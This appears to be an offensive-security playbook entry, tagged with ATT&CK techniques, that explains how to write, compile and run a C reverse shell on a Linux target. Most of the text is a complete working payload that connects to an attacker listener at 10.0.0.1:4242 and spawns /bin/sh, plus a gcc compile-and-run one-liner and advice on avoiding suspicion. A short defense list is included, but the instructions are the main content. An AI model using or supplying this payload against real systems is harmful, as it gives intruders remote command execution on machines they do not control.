---
type: procedure
tactics:
  - '[[tactics/Defense-Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/Command-Line-Interface|T1059 - Command-Line Interface]]'
  - '[[techniques/Compile-After-Delivery|T1500 - Compile After Delivery]]'
sub_techniques: []
tags:
  - '[[tags/C]]'
  - '[[tags/Reverse-Shell]]'
  - '[[tags/Reverse-Shell-Cheat-Sheet]]'
commands:
  - '[[commands/gcc-compile-c-reverse-shell-and-execute]]'
tools: []
platforms:
  - Linux
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# Establish-C-Reverse-Shell

## Summary

This procedure demonstrates how to create, compile, and execute a C program on a Linux target to establish a reverse shell connection back to an attacker-controlled machine, enabling remote command execution and persistence.

## Description

A C reverse shell involves writing a small C program that creates a TCP socket connection to the attacker's listener, redirects standard input/output/error streams to the socket, and spawns a shell. This technique is useful in post-exploitation scenarios where the attacker has code execution capability but needs to bypass restrictions on common shell tools. The program must be compiled on the target using a C compiler like gcc, which may require write access to a temporary directory and execution privileges. Once running, it provides an interactive shell without relying on external binaries like netcat. This method evades some detection by appearing as legitimate compilation activity but can be identified through process monitoring and network anomalies.

## Requirements

1. Write access to a directory on the target (e.g., /tmp) to save the C source file.
2. gcc or another C compiler installed on the target machine.
3. Network connectivity from the target to the attacker's IP and port.
4. Execution privileges on the target to run the compiled binary.
5. Attacker machine running a listener (e.g., netcat on port 4242).

## Defense

- Monitor for unexpected gcc or compilation processes on endpoints using EDR tools.
- Implement application whitelisting to restrict execution of compiled binaries.
- Network segmentation and egress filtering to block unauthorized outbound connections to attacker IPs.
- Log and alert on suspicious network flows to non-standard ports.

## Objectives

1. Compile a custom C reverse shell payload on the target.
2. Establish a TCP connection from the target to the attacker's listener.
3. Gain interactive shell access for command execution on the target.
4. Maintain persistence through the reverse connection.

## Instructions

### Step 1: Create the C Source File

**Context**: Write the C reverse shell code to a file on the target, such as /tmp/shell.c. This code creates a socket, connects to the attacker's IP and port, redirects I/O streams, and executes /bin/sh. Edit the IP (10.0.0.1) and port (4242) in the code to match your listener before saving.

**Code** ([[codes/C-Reverse-Shell-Payload]]):

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 4242;
    struct sockaddr_in revsockaddr;

    /* Create a socket */
    int sockt = socket(AF_INET, SOCK_STREAM, 0);

    /* Configure server details */
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.0.0.1");

    /* Connect to the server */
    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));

    /* Redirect standard input, output and error to the socket */
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    /* Execute a shell */
    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}
```

> This step ensures the payload is ready for compilation. Success is confirmed by verifying the file exists and contains the correct code using cat /tmp/shell.c.

### Step 2: Compile and Execute the Reverse Shell

**Context**: Compile the C source into an executable binary and immediately run it to establish the connection. This combines compilation and execution in one command to minimize detection windows. Use a temporary output name like 'csh' to avoid suspicion.

**Command** ([[commands/gcc-compile-c-reverse-shell-and-execute]]):

```bash
gcc /tmp/shell.c -o csh && ./csh
```

> The gcc command compiles the source with -o to specify the output binary. The && ensures execution only if compilation succeeds. Expected output includes no errors from gcc, and on the attacker side, a new connection to the listener with an interactive shell prompt.
